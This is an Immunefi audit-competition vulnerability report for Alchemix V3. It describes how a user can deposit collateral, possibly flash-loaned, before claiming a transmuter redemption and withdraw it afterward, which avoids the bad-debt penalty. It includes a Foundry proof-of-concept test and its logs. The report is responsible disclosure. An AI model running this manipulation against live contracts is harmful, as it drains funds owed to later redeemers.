# 58112 sc high a malicious user can avoid getting penalized upon a transmuter redemption by depositing and withdrawing collateral in the alchemist

**Submitted on Oct 30th 2025 at 18:14:31 UTC by @Oxdeadmanwalking for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58112
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/Transmuter.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

The Transmuter, calculates the `badDebtRatio` as `totalSyntheticsIssued (debt) /totalValue (collateral in alchemist and transmuter` which is then used to scale down the redeemed amount in case of bad debt to retain the health of the protocol. In order to calculate the `totalValue` the transmuter queries `alchemist.getTotalUnderlyingValue()`. `getTotalUnderlyingValue` however can easily be manipulatable via collateral deposits which can later be withdrawn with no cost, enabling the user to avoid the `badDebtRatio` penalty entirely. Since bad debt represents a deficit in assets (collateral) relative to debt and debt is represented as `alAssets` which can then be redeemed in the transmuter for underlying, avoiding the penalty means that later redemptions will be unable to be serviced. As a result, later users will lose their funds as underlying shares will have been depleted in the transmuter by the manipulation and earmarks will be unable to cover them.

## Vulnerability Details

In Transmuter, `badDebtRatio` is calculated as follows:

```
        // If the system experiences bad debt we use this ratio to scale back the value of yield tokens that are transmuted
        uint256 yieldTokenBalance = TokenUtils.safeBalanceOf(alchemist.myt(), address(this));
        // Avoid divide by 0
        uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) : 1;
        
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;

        if (badDebtRatio > 1e18) {
        // penalty applied here
            scaledTransmuted = amountTransmuted * FIXED_POINT_SCALAR / badDebtRatio;
        }
```

The numerator includes `alchemist.getTotalUnderlyingValue()` which in turn return the total underlying collateral deposited in the alchemist.

```
    /// @dev Calculates the total value of the alchemist in the underlying token.
    /// @return totalUnderlyingValue The total value of the alchemist in the underlying token.
    function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
        uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
        totalUnderlyingValue = yieldTokenTVLInUnderlying;
    }
```

`_mytSharesDeposited` however, gets increased during a deposit, even if the depositor does not borrow any assets.

```
    function deposit(uint256 amount, address recipient, uint256 tokenId) external returns (uint256) {
        _checkArgument(recipient != address(0));
        _checkArgument(amount > 0);
        _checkState(!depositsPaused);
        _checkState(_mytSharesDeposited + amount <= depositCap);

        // @audit, does not sync and earmark

        // Only mint a new position if the id is 0
        if (tokenId == 0) {
            tokenId = IAlchemistV3Position(alchemistPositionNFT).mint(recipient);
            emit AlchemistV3PositionNFTMinted(recipient, tokenId);
        } else {
            // else check that the token id provided exists
            _checkForValidAccountId(tokenId);
        }

        // collateral is credited per-nft like dyad
        // collateral == myt in deposit
        _accounts[tokenId].collateralBalance += amount;

        // Transfer tokens from msg.sender now that the internal storage updates have been committed.
        TokenUtils.safeTransferFrom(myt, msg.sender, address(this), amount);
        // assumed that myt shares are deposited
  @> _mytSharesDeposited += amount;

        emit Deposit(amount, tokenId);

        // @audit this converts the myt amount in to underlying and then applies the decimal 
        // normalization so that it all has 18 decimals
        return convertYieldTokensToDebt(amount);
    }
```

This opens a manipulation opportunity where someone can

1. Initiate a redemption and wait for maturity
2. In the meantime, bad debt occurs, the position matures
3. The user deposits significant collateral using `deposit` from another account without borrowing, causing `_mytSharesDeposited` to be artificially increased
4. Calls `claimRedemption` with the inflated `_mytSharesDeposited`. This queries the achemist to calculate the `badDebtRatio` but due to the big deposit, the ratio will be significantly less than expected.
5. The user gets back his whole redeemed amount without scaling it down, avoiding the penalty entirely.
6. The user then withdraws the deposited collateral from step 3. Note that depositing and withdrawing along with obtaining collateral incurs no cost or fees.

There is also nothing preventing the attacker from performing steps 3 to 6 attomically using a flash loans as 1. The MYT uses underlying collateral such as USDC and ETH which are readily available to flash loan in many venues without cost (like morpho) so a large amount of MYT shares can be obtained easily. 2. deposits and withdrawals from the alchemist can happen in the same block without restrictions. This allows the attacker to bypass the `badDebtRatio` penalty entirely without any capital.

`badDebtRatio` scales down the amount returned to the user from the transmuter but burns the whole staked `alAssets` after maturity. This would mean that the ratio will decrease over time as the numerator will decrease (debt, synthetics) more than the denominator (value).

If the user's redemption from manipulation represents a large share of total redemptions, `badDebtRatio` will never decrease meaning there wont be enough underlying collateral in the system to process later redemptions since debt will be more than collateral. In this case, later users using the transmuter will lose their funds as calls to `claimRedemption` will not be able to be serviced.

## Impact Details

Avoiding the bad debt ratio penalty can lead to stagnant bad debt which will cause later transmuter users to lose their funds as calls to `claimRedemption` will not be able to be serviced. If bad debt does not decrease, then the system will also remain insolvent.

## References

* <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1238>
* <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L219>

## Proof of Concept

## Proof of Concept

1. Add this test at the end of the file at `AlchemistV3.t.sol`

```
    /// @notice PoC: Bad debt ratio manipulation via deposit/withdraw sandwich attack
    function test_POC_bad_debt_ratio_manipulation_via_deposit_withdraw() public {
        // ========== SETUP ==========
        address user = makeAddr("user");
        uint256 initialDeposit = 100_000e18;
        uint256 borrowAmount = 90_000e18;

        // User deposits and borrows
        _magicDepositToVault(address(vault), user, initialDeposit);
        vm.startPrank(user);
        IERC20(address(vault)).approve(address(alchemist), type(uint256).max);
        alchemist.deposit(initialDeposit, user, 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
        alchemist.mint(tokenId, borrowAmount, user);
        vm.stopPrank();

        // User creates transmuter redemption
        uint256 redemptionAmount = 50_000e18;
        vm.startPrank(user);
        IERC20(alToken).approve(address(transmuterLogic), type(uint256).max);
        transmuterLogic.createRedemption(redemptionAmount);
        vm.stopPrank();

        uint256 redemptionId = 1;

        // ========== SIMULATE BAD DEBT using mockCall ==========
        // Mock totalSyntheticsIssued to return inflated value
        uint256 inflatedSynthetics = 300_000e18; // 3x the collateral value
        vm.mockCall(
            address(alchemist),
            abi.encodeWithSelector(alchemist.totalSyntheticsIssued.selector),
            abi.encode(inflatedSynthetics)
        );

        uint256 totalValue = alchemist.getTotalUnderlyingValue();
        uint256 totalSynthetics = alchemist.totalSyntheticsIssued();
        uint256 badDebtRatio = (totalSynthetics * 1e18) / totalValue;

        console.log("\n========== BAD DEBT STATE ==========");
        console.log("Total value:", totalValue);
        console.log("Total synthetics:", totalSynthetics);
        console.log("Bad debt ratio:", badDebtRatio);

        assertTrue(badDebtRatio > 1e18, "Should have bad debt");

        // Advance time to allow claiming
        vm.roll(block.number + transmuterLogic.timeToTransmute() + 1);

        // ========== SCENARIO 1: Claim WITHOUT manipulation ==========
        uint256 snapshot = vm.snapshot();

        vm.prank(user);
        transmuterLogic.claimRedemption(redemptionId);
        uint256 receivedWithoutManipulation = IERC20(address(vault)).balanceOf(user);

        console.log("\n========== WITHOUT MANIPULATION ==========");
        console.log("User only called claimRedemption ceteris paribus");
        console.log("Underlying received:", receivedWithoutManipulation);

        // ========== SCENARIO 2: Claim WITH manipulation ==========
        vm.revertTo(snapshot);

        // User deposits to manipulate ratio with an unrelated wallet
        address attacker = makeAddr("attacker");
        uint256 manipulationDeposit = 100_000e18;
        _magicDepositToVault(address(vault), attacker, manipulationDeposit);
        vm.startPrank(attacker);
        // max approve 
        IERC20(address(vault)).approve(address(alchemist), type(uint256).max);
        alchemist.deposit(manipulationDeposit, attacker, 0);
        vm.stopPrank();

        uint256 manipulatedValue = alchemist.getTotalUnderlyingValue();
        uint256 manipulatedRatio = (totalSynthetics * 1e18) / manipulatedValue;

        console.log("\n========== WITH MANIPULATION ==========");
        console.log("User deposited a large amount without debt to manipulate ratio");
        console.log("Deposit:", manipulationDeposit);
        console.log("New value:", manipulatedValue);
        console.log("New bad debt ratio:", manipulatedRatio);

        vm.prank(user);
        transmuterLogic.claimRedemption(redemptionId);
        uint256 receivedWithManipulation = IERC20(address(vault)).balanceOf(user);

        console.log("Underlying received:", receivedWithManipulation);

        // ========== IMPACT ==========
        uint256 excessReceived = receivedWithManipulation - receivedWithoutManipulation;

        console.log("\n========== IMPACT ==========");
        console.log("Excess underlying received:", excessReceived);
        console.log("Improvement:", (excessReceived * 10000) / receivedWithoutManipulation, "bps");

        assertTrue(receivedWithManipulation > receivedWithoutManipulation, "Manipulation should help");

        // after the manipulation, the user can freely withdraw the manipulation deposit
        vm.startPrank(attacker);
        uint256 attackerTokenId = 2;
        alchemist.withdraw(manipulationDeposit, attacker, attackerTokenId);
        vm.stopPrank();

        console.log("Attacker withdrew the manipulation deposit, making debt ratio same as before");
        console.log("Obtaining collateral along with depositing and withdrawing incurs no cost");
        console.log("");
    }
```

2. Run the test:

```
forge test --match-test test_POC_bad_debt_ratio_manipulation_via_deposit_withdraw -vv
```

3. Observe the logs. The user was able to successfully redeem more underlying assets from the transmuter by performing the deposit. Then, he was able to withdraw the whole amount without any cost.

```
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] test_POC_bad_debt_ratio_manipulation_via_deposit_withdraw() (gas: 4217812)
Logs:
  
========== BAD DEBT STATE ==========
  Total value: 100000000000000000000000
  Total synthetics: 300000000000000000000000
  Bad debt ratio: 3000000000000000000
  
========== WITHOUT MANIPULATION ==========
  User only called claimRedemption ceteris paribus
  Underlying received: 16650000000000000000000
  
========== WITH MANIPULATION ==========
  User deposited a large amount without debt to manipulate ratio
  Deposit: 100000000000000000000000
  New value: 200000000000000000000000
  New bad debt ratio: 1500000000000000000
  Underlying received: 33300000000000000000000
  
========== IMPACT ==========
  Excess underlying received: 16650000000000000000000
  Improvement: 10000 bps
  Attacker withdrew the manipulation deposit, making debt ratio same as before
  Obtaining collateral along with depositing and withdrawing incurs no cost
```
